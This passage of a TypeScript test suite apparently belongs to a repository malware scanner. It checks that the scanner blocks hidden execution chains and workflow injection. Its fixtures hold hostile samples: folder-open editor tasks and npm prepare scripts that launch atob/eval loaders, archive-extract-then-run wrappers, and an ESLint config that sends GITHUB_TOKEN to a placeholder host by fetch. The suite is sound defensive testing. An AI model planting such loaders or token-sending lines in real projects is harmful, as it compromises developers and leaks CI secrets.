      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const parser = await repo({
      'vendor/stage-a-yaml-parser.mjs': 'export const reviewed = true;\n'
    });
    expect(
      scanGitTree(parser.root, parser.sha, {
        changedPaths: ['vendor/stage-a-yaml-parser.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const verifier = await repo({
      'scripts/verify-node.mjs': 'process.exit(0);\n'
    });
    expect(
      scanGitTree(verifier.root, verifier.sha, {
        changedPaths: ['scripts/verify-node.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });
  });

  it('requires review when a trusted workflow is deleted from the candidate tree', async () => {
    const fixture = await repo({
      '.github/workflows/ci.yml': [
        'name: ci',
        'on: push',
        'permissions:',
        '  contents: read',
        'jobs: {}'
      ].join('\n')
    });
    await rm(path.join(fixture.root, '.github/workflows/ci.yml'));
    execFileSync('git', ['-C', fixture.root, 'add', '--all']);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'remove CI trust root'
    ]);
    const head = execFileSync(
      'git',
      ['-C', fixture.root, 'rev-parse', 'HEAD'],
      { encoding: 'utf8' }
    ).trim();
    const changedPaths = listPullRequestChanges(
      fixture.root,
      fixture.sha,
      head
    );

    expect(changedPaths).toContain('.github/workflows/ci.yml');
    expect(scanGitTree(fixture.root, head, { changedPaths })).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'workflow-trust-root-removal-review:.github/workflows/ci.yml'
      ]
    });
  });

  it('traces automatic editor tasks through extensionless loaders without executing them', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'workspace bootstrap',
            runOptions: { runOn: 'folderOpen' },
            command: 'node',
            args: ['init']
          }
        ]
      }),
      init: 'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('init'),
        expect.stringContaining('execution-chain:.vscode/tasks.json -> init')
      ])
    );
  });

  it('recognizes JSONC folder-open tasks before suspicious loaders execute', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': [
        '{',
        '  // This file uses valid VS Code JSONC.',
        '  "version": "2.0.0",',
        '  "tasks": [{ "runOptions": { "runOn": "folderOpen" }, "command": "node init", },],',
        '}'
      ].join('\n'),
      init: 'const payload = atob(encoded); eval(payload);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('execution-chain:.vscode/tasks.json -> init')
      ])
    );
  });

  it('detects a bundled payload launch in changed shell code', async () => {
    const source = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': fixtureSource(
        '#!/bin/sh\n',
        'tar',
        ' xvf archive.tar',
        ' && node ./payload/init'
      )
    });
    const result = scanGitTree(source.root, source.sha, {
      changedPaths: ['runner.sh']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([expect.stringContaining('#archive-execution')])
    );
  });

  it('blocks extraction and execution but not archive creation in changed lifecycle shell wrappers', async () => {
    const malicious = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': fixtureSource(
        '#!/bin/sh\n',
        'tar',
        ' -xzf payload.tar.gz',
        ' && node ./payload/init'
      )
    });
    const blocked = scanGitTree(malicious.root, malicious.sha, {
      changedPaths: ['runner.sh']
    });
    expect(blocked.status).toBe('blocked');
    expect(blocked.findings).toEqual(
      expect.arrayContaining([expect.stringContaining('#archive-execution')])
    );
    const harmless = await repo({
      'package.json': JSON.stringify({ scripts: { build: 'sh ./runner.sh' } }),
      'runner.sh': '#!/bin/sh\ntar -czf dist.tar.gz ./dist && node ./build.js',
      'build.js': 'console.log("built");'
    });
    const accepted = scanGitTree(harmless.root, harmless.sha, {
      changedPaths: ['runner.sh']
    });
    expect(
      accepted.findings.some((finding) =>
        finding.includes('#archive-execution')
      )
    ).toBe(false);
  });

  it.each([
    ['cpio', fixtureSource('cpio', ' -idmv < bundle.cpio\n./bundle/init.sh')],
    [
      'CPIO with Windows batch call',
      fixtureSource('cpio', ' -id < bundle.cpio && call .\\bundle\\init.cmd')
    ],
    [
      'PowerShell Start-Process',
      fixtureSource(
        'Expand',
        '-Archive bundle.zip -DestinationPath out; Start',
        '-Process -FilePath .\\out\\init.exe'
      )
    ],
    ['bsdtar', fixtureSource('bsdtar', ' -xf bundle.tar\nnode bundle/init.js')],
    ['7-Zip', fixtureSource('7za', ' x bundle.7z\nnode bundle/init.js')],
    ['7zr', fixtureSource('7zr', ' x bundle.7z\nnode bundle/init.js')],
    ['RAR', fixtureSource('unrar', ' x bundle.rar\n./bundle/init.sh')],
    [
      'PowerShell',
      fixtureSource(
        'Expand',
        '-Archive bundle.zip -DestinationPath out\n./out/init.ps1'
      )
    ],
    [
      'Java archives',
      fixtureSource('jar', ' xf bundle.jar\njava -jar bundle/app.jar')
    ],
    [
      'Python archive modules',
      fixtureSource('python', ' -m zipfile -e bundle.zip out\nnode out/init.js')
    ]
  ])('blocks %s extraction followed by execution', async (_label, source) => {
    const fixture = await repo({ 'runner.sh': `#!/bin/sh\n${source}` });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['runner.sh']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('runner.sh#archive-execution');
  });

  it('blocks Python archive library extraction followed by process launch', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'python3 bootstrap.py' }
      }),
      'bootstrap.py': [
        'import subprocess',
        'import zipfile',
        "with zipfile.ZipFile('bundle.zip') as archive:",
        fixtureSource('    archive.extract', "all('out')"),
        "subprocess.run(['node', 'out/init.js'])"
      ].join('\n')
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('bootstrap.py#archive-execution');
  });

  it.each([
    [
      'AdmZip API',
      fixtureSource(
        "new AdmZip('bundle.zip').extractAll",
        "To('out'); child_process.spawn('node', ['out/init.js']);"
      )
    ],
    [
      'node tar API',
      fixtureSource(
        'tar.',
        "x({ file: 'bundle.tar', cwd: 'out' }); new Deno.Command('node', { args: ['out/init.js'] });"
      )
    ],
    [
      'Python shutil API',
      fixtureSource(
        'shutil.unpack',
        "_archive('bundle.zip', 'out'); subprocess.run(['node', 'out/init.js']);"
      )
    ],
    [
      'unzipper API',
      fixtureSource(
        'unzipper.Ex',
        "tract({ path: 'out' }); child_process.spawn('node', ['out/init.js']);"
      )
    ],
    [
      'extract-zip API',
      fixtureSource(
        'extract',
        "Zip('bundle.zip', 'out'); child_process.execFile('node', ['out/init.js']);"
      )
    ],
    [
      'decompress API',
      fixtureSource(
        'decom',
        "press('bundle.zip', 'out'); child_process.spawn('node', ['out/init.js']);"
      )
    ],
    [
      'node-stream-zip API',
      fixtureSource(
        'zip.ex',
        "tract(null, 'out', () => child_process.execFile('node', ['out/init.js']));"
      )
    ]
  ])(
    'blocks %s extraction followed by process launch',
    async (_label, source) => {
      const fixture = await repo({
        'package.json': JSON.stringify({
          scripts: { prepare: 'node bootstrap.js' }
        }),
        'bootstrap.js': source
      });
      const result = scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['package.json']
      });

      expect(result.status).toBe('blocked');
      expect(result.findings).toContain('bootstrap.js#archive-execution');
    }
  );

  it('traces literal PowerShell Start-Process targets and keeps dynamic targets incomplete', async () => {
    const literal = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'powershell -File wrapper.ps1' }
      }),
      'wrapper.ps1': "Start-Process -FilePath '.\\payload.ps1'",
      'payload.ps1': 'eval(atob(encoded_source))'
    });
    const traced = scanGitTree(literal.root, literal.sha, {
      changedPaths: ['package.json']
    });
    expect(traced.status).toBe('blocked');
    expect(traced.findings).toContain(
      'execution-chain:package.json -> wrapper.ps1 -> payload.ps1'
    );

    const dynamic = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'powershell -File wrapper.ps1' }
      }),
      'wrapper.ps1': 'Start-Process $env:TOOLIP_TARGET'
    });
    const unresolved = scanGitTree(dynamic.root, dynamic.sha, {
      changedPaths: ['package.json']
    });
    expect(unresolved.status).toBe('incomplete');
    expect(unresolved.incompleteReasons).toContain(
      'unresolved-powershell-process:wrapper.ps1'
    );
  });

  it('blocks a wrapper that executes a uniquely assigned local shell variable', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'target=./payload.orc; node "$target"',
      'payload.orc': 'const decoded = atob(encoded); eval(decoded);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining(
          'execution-chain:package.json -> runner.sh -> payload.orc'
        )
      ])
    );
  });

  it('blocks a two-step static shell alias from lifecycle script to encoded payload', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'target=./payload.orc; launch=$target; node "$launch"',
      'payload.orc': 'const decoded = atob(encoded); eval(decoded);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining(
          'execution-chain:package.json -> runner.sh -> payload.orc'
        )
      ])
    );
  });

  it('blocks a shell -c wrapper with an exact local target alias before install', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'target=./payload.orc; sh -c "$target"',
      'payload.orc': 'const decoded = atob(encoded); eval(decoded);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining(
          'execution-chain:package.json -> runner.sh -> payload.orc'
        )
      ])
    );
  });

  it('leaves Stage A incomplete for a dynamic shell -c target', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'target=$GENERATED_TARGET; sh -c "$target"'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('incomplete');
    expect(result.incompleteReasons).toContain(
      'execution-reference-coverage-incomplete'
    );
  });

  it('leaves Stage A incomplete for shell eval command text', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'eval "$COMMAND"'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('incomplete');
    expect(result.incompleteReasons).toContain(
      'execution-reference-coverage-incomplete'
    );
  });

  it('does not fabricate an execution chain through single-quoted shell aliases', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'sh ./runner.sh' }
      }),
      'runner.sh': 'target=./payload.orc; launch=\'$target\'; node "$launch"',
      'payload.orc': 'const decoded = atob(encoded); eval(decoded);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(
      result.findings.some((finding) =>
        finding.includes(
          'execution-chain:package.json -> runner.sh -> payload.orc'
        )
      )
    ).toBe(false);
  });

  it('blocks Node preload loaders before an npm lifecycle script can execute', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'node --require ./init.js ./safe.js' }
      }),
      'safe.js': 'console.log("ok");',
      'init.js': 'const payload = atob(encoded); eval(payload);'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('execution-chain:package.json -> init.js')
      ])
    );
  });

  it('traces an encoded ESLint config loader into an extensionless target', async () => {
    const fixture = await repo({
      'eslint.config.js':
        "import './init';\nconst payload = atob(encoded); eval(payload);",
      init: fixtureSource(
        "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { body: process.env.",
        'GITHUB_TOKEN',
        ' });'
      )
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toEqual(
      expect.arrayContaining([
        expect.stringContaining('eslint.config.js'),
        expect.stringContaining('execution-chain:eslint.config.js -> init')
      ])
    );
    expect(JSON.stringify(result.findings)).not.toContain(
      'https://collector.invalid'
    );
    expect(JSON.stringify(result.findings)).not.toContain('GITHUB_TOKEN');
  });

  it('traces an unchanged payload when a benign-looking file is renamed into an entrypoint', async () => {
    const fixture = await repo({
      'configuration.txt': "import './init';\nexport default [];\n",
      init: 'const payload = atob(encoded); eval(payload);'
    });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await import('node:fs/promises').then(({ rename }) =>
      rename(
        path.join(fixture.root, 'configuration.txt'),
        path.join(fixture.root, 'eslint.config.js')
      )
    );
    git(['add', '--all']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'rename config entrypoint'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    const changedPaths = listPullRequestChanges(
      fixture.root,
      fixture.sha,
      head
    );
    const result = scanGitTree(fixture.root, head, { changedPaths });

    expect(changedPaths).toContain('eslint.config.js');
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> init'
    );
  });

  it('traces unchanged payloads when an entrypoint diff changes whitespace only', async () => {
    const fixture = await repo({
      'eslint.config.js': "import './init';\nexport default [];\n",
      init: 'const payload = atob(encoded); eval(payload);'
    });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await writeFile(
      path.join(fixture.root, 'eslint.config.js'),
      "import './init';\n\nexport default [];\n"
    );
    git(['add', 'eslint.config.js']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'whitespace config change'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    const changedPaths = listPullRequestChanges(
      fixture.root,
      fixture.sha,
      head
    );
    const result = scanGitTree(fixture.root, head, { changedPaths });

    expect(changedPaths).toEqual(['eslint.config.js']);
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> init'
    );
  });

  it.each([
    [
      'an aliased ESM spawn import',
      "import { spawn as launch } from 'node:child_process'; launch('node', ['payload.js']);"
    ],
    [
      'a destructured CommonJS execFile import',
      "const { execFile: launch } = require('child_process'); launch('node', ['payload.js']);"
    ],
    [
      'a CommonJS namespace alias',
      "const cp = require('node:child_process'); cp.fork('payload.js');"
    ],
    [
      'a local alias of an imported API',
      "import * as cp from 'node:child_process'; const launch = cp.spawn; launch('node', ['payload.js']);"
    ],
    [
      'a literal dynamic import alias',
      "const { spawn: launch } = await import('node:child_process'); launch('node', ['payload.js']);"
    ],
    [
      'a computed namespace method',
      "import * as cp from 'node:child_process'; cp[method]('node', ['payload.js']);"
    ],
    [
      'a reflective named API invocation',
      "import { spawn as launch } from 'node:child_process'; Reflect.apply(launch, undefined, ['node', ['payload.js']]);"
    ],
    [
      'a call-method API invocation',
      "const { spawn: launch } = require('node:child_process'); launch.call(undefined, 'node', ['payload.js']);"
    ],
    [
      'a reflective namespace API invocation',
      "import * as cp from 'node:child_process'; Reflect.apply(cp.spawn, undefined, ['node', ['payload.js']]);"
    ]
  ])(
    'keeps %s from receiving a clean Stage A result',
    async (_label, source) => {
      const fixture = await repo({ 'eslint.config.js': source });
      const result = scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['eslint.config.js']
      });
      expect(result.status).not.toBe('approved');
      expect(result.incompleteReasons).toContain(
        'unresolved-child-process-execution:eslint.config.js'
      );
    }
  );

  it('approves benign editor and package tasks without classifying automation alone as malicious', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'build workspace',
            runOptions: { runOn: 'folderOpen' },
            command: 'npm',
            args: ['run', 'build']
          }
        ]
      }),
      'package.json': JSON.stringify({
        scripts: { build: 'tsc --noEmit', test: 'vitest run' }
      }),
      'src/index.ts': 'export const ready = true;\n'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('approved');
    expect(result.findings).toEqual([]);
  });

  it('traces workflow package scripts to unchanged local loaders', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: npm run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({
        scripts: { prepare: 'node init' }
      }),
      init: 'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> package.json -> init'
    );
  });

  it('traces block-form workflow commands into exact workspace package scripts', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - name: workspace script',
        '        working-directory: packages/app',
        '        run: |',
        '          pnpm --filter @fixture/app run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({
        name: 'fixture-root',
        workspaces: ['packages/*']
      }),
      'packages/app/package.json': JSON.stringify({
        name: '@fixture/app',
        scripts: { prepare: 'node scripts/bootstrap' }
      }),
      'packages/app/scripts/bootstrap':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> packages/app/package.json -> packages/app/scripts/bootstrap'
    );
  });

  it('applies job default working directories to package script chains', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    defaults:',
        '      run:',
        '        working-directory: ./packages/app',
        '    steps:',
        '      - run: |',
        '          npm run prepare'
      ].join('\n'),
      'packages/app/package.json': JSON.stringify({
        name: '@fixture/app',
        scripts: { prepare: 'node init' }
      }),
      'packages/app/init':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.github/workflows/build.yml -> packages/app/package.json -> packages/app/init'
    );
  });

  it('marks dynamic workflow working directories incomplete', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'defaults:',
        '  run:',
        `    working-directory: \${{ inputs.package }}`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: npm run prepare'
      ].join('\n'),
      'package.json': JSON.stringify({ scripts: { prepare: 'node init' } }),
      init: 'export const safe = true;\n'
    });
    expect(
      scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['.github/workflows/build.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['execution-reference-coverage-incomplete']
    });
  });

  it('follows automatic editor-task dependencies and workspace-relative commands', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'open workspace',
            runOptions: { runOn: 'folderOpen' },
            dependsOn: 'bootstrap'
          },
          {
            label: 'bootstrap',
            command: 'node',
            args: ['init'],
            options: { cwd: 'packages/app' }
          }
        ]
      }),
      'packages/app/init':
        'const payload = atob("cHJvY2Vzcy5lbnY="); eval(payload);\n'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.vscode/tasks.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:.vscode/tasks.json -> packages/app/init'
    );
  });

  it('marks unresolved workspace filters and interpolation in block runs incomplete', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: |',
        `          pnpm --filter "\${{ inputs.workspace }}" run build`,
        `          echo "\${{ github.event.pull_request.title }}"`
      ].join('\n'),
      'package.json': JSON.stringify({ name: 'fixture-root' })
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['.github/workflows/build.yml']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      '.github/workflows/build.yml#untrusted-event-shell-interpolation'
    );
    expect(result.incompleteReasons).toContain(
      'execution-reference-coverage-incomplete'
    );
  });

  it('keeps repository workflow shell commands free of event and output data', async () => {
    const workflowPaths = [
      '.github/workflows/ci.yml',
      '.github/workflows/codeql.yml',
      '.github/workflows/github-release.yml',
      '.github/workflows/pr-quality.yml',
      '.github/workflows/publish.yml',
      '.github/workflows/stage-a.yml'
    ];
    for (const workflowPath of workflowPaths) {
      const source = await readFile(workflowPath, 'utf8');
      const unsafe = workflowRunCommands(source, workflowPath).filter(
        (command) =>
          command.unsafeEnvironmentReference ||
          command.untrustedExpression ||
          command.untrustedEventExpression ||
          command.malformedExpression
      );
      expect(unsafe, workflowPath).toEqual([]);
    }
  });

  it('blocks untrusted workflow outputs and tainted environment values in shell steps', async () => {
    const outputExpression = await repo({
      '.github/workflows/output.yml': [
        'name: output',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        `      - run: echo "\${{ needs.inspect.outputs.title }}"`,
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(outputExpression.root, outputExpression.sha)
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/output.yml#untrusted-shell-input']
    });

    const secretExpression = await repo({
      '.github/workflows/secret.yml': [
        'name: secret',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        `      - run: echo "\${{ secrets.DEPLOY_TOKEN }}"`,
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(secretExpression.root, secretExpression.sha)
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/secret.yml#untrusted-shell-input']
    });

    const taintedEnvironment = await repo({
      '.github/workflows/env.yml': [
        'name: env',
        'on: pull_request',
        'env:',
        `  PR_TITLE: "\${{ github.event.pull_request.title }}"`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: printf "%s" "$PR_TITLE"',
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(taintedEnvironment.root, taintedEnvironment.sha)
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/env.yml#untrusted-shell-input']
    });

    const unusedEnvironment = await repo({
      '.github/workflows/env.yml': [
        'name: env',
        'on: pull_request',
        'env:',
        `  PR_TITLE: "\${{ github.event.pull_request.title }}"`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: printf safe',
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(unusedEnvironment.root, unusedEnvironment.sha).status
    ).toBe('approved');
  });

  it('accepts only the exact protected scanner environment contract', async () => {
    const protectedScanner = await repo({
      '.github/workflows/stage-a.yml': [
        'name: scanner',
        'on: pull_request_target',
        'jobs:',
        '  scan:',
        '    steps:',
        '      - env:',
        `          GITHUB_TOKEN: "\${{ github.token }}"`,
        `          STAGE_A_REPOSITORY: "\${{ github.repository }}"`,
        `          STAGE_A_PR_NUMBER: "\${{ github.event.pull_request.number }}"`,
        '        run: node scripts/stage-a-gate.mjs',
        ''
      ].join('\n'),
      'scripts/stage-a-gate.mjs': 'process.stdout.write("safe");\n'
    });
    expect(
      scanGitTree(protectedScanner.root, protectedScanner.sha).status
    ).toBe('approved');

    const changedBinding = await repo({
      '.github/workflows/stage-a.yml': [
        'name: scanner',
        'on: pull_request_target',
        'jobs:',
        '  scan:',
        '    steps:',
        '      - env:',
        `          STAGE_A_REPOSITORY: "\${{ github.event.pull_request.title }}"`,
        '        run: node scripts/stage-a-gate.mjs',
        ''
      ].join('\n'),
      'scripts/stage-a-gate.mjs': 'process.stdout.write("safe");\n'
    });
    expect(scanGitTree(changedBinding.root, changedBinding.sha)).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/stage-a.yml#untrusted-shell-input']
    });

    for (const [workflowPath, workingDirectory] of [
      ['.github/workflows/other.yml', undefined],
      ['.github/workflows/stage-a.yml', 'payload']
    ] as const) {
      const misplacedScanner = await repo({
        [workflowPath]: [
          'name: scanner',
          'on: pull_request_target',
          'jobs:',
          '  scan:',
          '    steps:',
          '      - env:',
          `          GITHUB_TOKEN: "\${{ github.token }}"`,
          ...(workingDirectory
            ? [`        working-directory: ${workingDirectory}`]
            : []),
          '        run: node scripts/stage-a-gate.mjs',
          ''
        ].join('\n'),
        'scripts/stage-a-gate.mjs': 'process.stdout.write("safe");\n'
      });
      expect(
        scanGitTree(misplacedScanner.root, misplacedScanner.sha)
      ).toMatchObject({
        status: 'blocked',
        findings: [`${workflowPath}#untrusted-shell-input`]
      });
    }
  });

  it('blocks event and action-output expressions wrapped in workflow functions', async () => {
    const wrappedEvent = await repo({
      '.github/workflows/event.yml': [
        'name: event',
        'on: pull_request',
        'env:',
        `  PR_TITLE: "\${{ format('{0}', github.event.pull_request.title) }}"`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: printf "%s" "$PR_TITLE"',
        ''
      ].join('\n')
    });
    expect(scanGitTree(wrappedEvent.root, wrappedEvent.sha)).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/event.yml#untrusted-shell-input']
    });

    const wrappedActionOutput = await repo({
      '.github/workflows/output.yml': [
        'name: output',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        `      - run: echo "\${{ format('{0}', steps.prepare.outputs.title) }}"`,
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(wrappedActionOutput.root, wrappedActionOutput.sha)
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/output.yml#untrusted-shell-input']
    });

    const bracketedContext = await repo({
      '.github/workflows/bracket.yml': [
        'name: bracket',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        `      - run: echo "\${{ format('{0}', github['event']['pull_request']['title']) }}"`,
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(bracketedContext.root, bracketedContext.sha)
    ).toMatchObject({
      status: 'blocked',
      findings: [
        '.github/workflows/bracket.yml#untrusted-event-shell-interpolation',
        '.github/workflows/bracket.yml#untrusted-shell-input'
      ]
    });

    const inheritedEvent = await repo({
      '.github/workflows/inherited.yml': [
        'name: inherited',
        'on: pull_request',
        'env:',
        `  PR_TITLE: "\${{ format('{0}', github.event.pull_request.title) }}"`,
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: node scripts/read-env.mjs',
        ''
      ].join('\n'),
      'scripts/read-env.mjs':
        'process.stdout.write(process.env.PR_TITLE ?? "");\n'
    });
    expect(scanGitTree(inheritedEvent.root, inheritedEvent.sha)).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/inherited.yml#untrusted-shell-input']
    });
  });

  it('fails closed on malformed or over-budget workflow expressions', async () => {
    const fixture = await repo({
      '.github/workflows/malformed.yml': [
        'name: malformed',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: echo "${{ github.event.pull_request.title"',
        ''
      ].join('\n')
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'blocked',
      incompleteReasons: [
        'workflow-expression-coverage-incomplete:.github/workflows/malformed.yml'
      ]
    });

    const oversizedExpression = await repo({
      '.github/workflows/oversized.yml': [
        'name: oversized',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        `      - run: echo "\${{ ${'x'.repeat(4097)} }}"`,
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(oversizedExpression.root, oversizedExpression.sha)
    ).toMatchObject({
      status: 'blocked',
      incompleteReasons: [
        'workflow-expression-coverage-incomplete:.github/workflows/oversized.yml'
      ]
    });
  });

  it('fails closed on malformed changed workflow YAML', async () => {
    const fixture = await repo({
      '.github/workflows/build.yml': [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - run: "node init'
      ].join('\n')
    });
    expect(() =>
      scanGitTree(fixture.root, fixture.sha, {
        changedPaths: ['.github/workflows/build.yml']
      })
    ).toThrow('Malformed GitHub Actions workflow YAML');
  });

  it('rejects duplicate workflow keys and excessive YAML alias expansion', async () => {
    const workflows = [
      ['name: build', 'jobs: {}', 'jobs: {}'].join('\n'),
      [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - &command { run: "echo safe" }',
        ...Array.from({ length: 17 }, () => '      - *command')
      ].join('\n')
    ];

    for (const workflow of workflows) {
      const fixture = await repo({
        '.github/workflows/build.yml': workflow
      });
      expect(() =>
